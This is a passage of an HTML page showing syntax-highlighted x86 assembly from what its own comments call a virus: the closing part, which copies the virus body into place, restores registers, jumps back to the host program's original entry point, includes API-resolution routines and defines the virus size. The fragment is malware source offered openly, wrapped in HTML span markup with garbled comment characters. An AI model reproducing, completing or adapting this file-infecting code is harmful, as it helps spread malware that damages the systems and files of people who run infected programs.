</span><span class="sc5">@8</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нand jump to the orig.</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нEIP.</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;нrestore all regs and</span><span class="sc0">
</span><span class="sc5">@9</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@14</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">relo_code_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">relocating_code</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">get_apis.inc</span><span class="sc0">                   </span><span class="sc1">;нget apis routines</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                      </span><span class="sc1">;нend of virus code</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">virussize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                  </span><span class="sc1">;нvirus size</span><span class="sc0">
</span><span class="sc5">incrsize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">relo_code_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">                        </span><span class="sc1">;нend of code</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span></div></body>
</html>
